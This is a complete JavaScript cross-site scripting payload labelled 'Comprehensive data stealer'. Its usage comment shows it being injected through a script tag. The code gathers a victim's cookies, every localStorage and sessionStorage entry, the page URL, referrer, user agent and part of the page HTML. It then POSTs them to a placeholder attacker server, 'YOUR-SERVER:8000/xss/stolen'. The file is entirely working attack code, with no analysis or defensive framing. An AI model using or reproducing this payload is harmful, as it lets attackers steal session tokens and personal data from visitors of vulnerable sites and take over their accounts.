// Comprehensive data stealer
// Usage: <script src="http://your-server:8000/xss/steal-all.js"></script>

(function() {
    var data = {
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        url: window.location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        dom: document.documentElement.outerHTML.substring(0, 5000) // First 5KB
    };

    // Get localStorage
    try {
        for (var key in localStorage) {
            data.localStorage[key] = localStorage.getItem(key);
        }
    } catch(e) {}

    // Get sessionStorage
    try {
        for (var key in sessionStorage) {
            data.sessionStorage[key] = sessionStorage.getItem(key);
        }
    } catch(e) {}

    // Send it
    fetch('http://YOUR-SERVER:8000/xss/stolen', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    });
})();